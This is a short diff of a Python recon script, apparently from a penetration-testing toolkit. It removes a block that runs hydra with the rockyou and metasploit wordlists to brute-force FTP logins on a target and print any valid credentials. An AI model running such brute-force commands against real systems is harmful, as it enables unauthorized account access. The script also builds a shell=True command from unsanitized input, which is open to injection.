@@ -18,13 +18,5 @@ def main(args):
     f.write(results)
     f.close
 
-    print("INFO: Performing hydra ftp scan against " + ip_address )
-    HYDRA = "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /root/wordlists/rockyou.txt -f -o discovery/ftp/%s_ftphydra.txt -u %s -s %s ftp" % (ip_address, ip_address, port)
-    results = subprocess.check_output(HYDRA, shell=True)
-    resultarr = results.split("\n")
-    for result in resultarr:
-        if "login:" in result:
-            print("[*] Valid ftp credentials found: " + result )
-
 if __name__=='__main__':
     main(sys.argv)
